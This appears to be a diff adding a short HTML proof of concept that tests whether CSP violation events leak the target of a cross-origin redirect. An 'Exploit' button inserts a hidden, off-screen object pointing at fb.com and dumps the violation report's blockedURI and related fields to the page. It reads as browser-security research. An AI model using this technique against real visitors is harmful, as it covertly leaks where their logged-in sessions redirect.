@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CSP Redirect URL (object-src)</title>
+
+<meta http-equiv="Content-Security-Policy" content="
+  default-src 'self' 'unsafe-inline';
+  object-src https://fb.com;
+">
+
+</head>
+<body>
+
+<button id="btn">Exploit</button>
+
+<script>
+document.getElementById('btn').addEventListener('click', exploit);
+
+document.addEventListener('securitypolicyviolation', e => {
+  const props = new Set('url,documentURL,blockedURL,documentURI,blockedURI,referrer,sample,sourceFile,script-sample,message,stack,reason,href,src,data,target'.split(','));
+  document.write('<pre>' + JSON.stringify(e, [...props], 2) + '</pre>');
+});
+
+function exploit() {
+  const obj = document.createElement('object');
+  obj.data = 'https://fb.com/4';
+
+  // biar stealth (optional)
+  obj.style.width = '1px';
+  obj.style.height = '1px';
+  obj.style.position = 'absolute';
+  obj.style.left = '-9999px';
+
+  document.body.appendChild(obj);
+}
+</script>
+
+</body>
+</html>
